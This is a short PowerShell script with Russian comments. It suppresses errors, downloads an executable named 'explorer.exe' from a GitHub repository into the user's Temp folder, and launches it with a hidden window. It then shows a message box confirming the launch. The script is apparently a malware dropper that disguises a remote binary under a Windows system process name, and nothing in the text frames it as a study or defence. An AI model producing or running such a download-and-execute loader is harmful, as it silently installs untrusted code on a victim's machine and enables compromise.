$ErrorActionPreference = 'SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$url = "https://github.com/3465h/idkkkk/raw/refs/heads/main/explorer.exe"
$path = Join-Path $env:TEMP "explorer.exe"

# Качаем через встроенный метод, это надежнее чем curl в пайпе
Invoke-WebRequest -Uri $url -OutFile $path -UseBasicParsing

if (Test-Path $path) {
    Start-Process $path -WindowStyle Hidden
    
    # Чтобы не было ошибок с типами в iex
    Add-Type -AssemblyName Microsoft.VisualBasic
    [Microsoft.VisualBasic.Interaction]::MsgBox("Файл успешно запущен из Temp!", "OKOnly,Information", "Статус")
}
